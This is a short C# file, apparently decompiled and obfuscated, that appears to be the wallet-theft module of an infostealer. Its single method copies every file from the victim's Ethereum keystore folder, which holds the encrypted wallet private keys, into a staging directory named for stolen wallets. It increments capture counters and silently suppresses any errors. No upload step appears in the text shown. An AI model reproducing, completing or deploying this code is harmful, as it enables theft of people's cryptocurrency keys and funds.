using System.IO;

internal class Class66
{
	public static int int_0 = 0;

	public static string string_0 = "\\Wallets\\Ethereum\\";

	public static void smethod_0(string string_1)
	{
		try
		{
			FileInfo[] files = new DirectoryInfo(Class38.string_3 + "\\Ethereum\\keystore").GetFiles();
			foreach (FileInfo fileInfo in files)
			{
				Directory.CreateDirectory(string_1 + string_0);
				fileInfo.CopyTo(string_1 + string_0 + fileInfo.Name);
			}
			int_0++;
			Class36.int_12++;
		}
		catch
		{
		}
	}
}
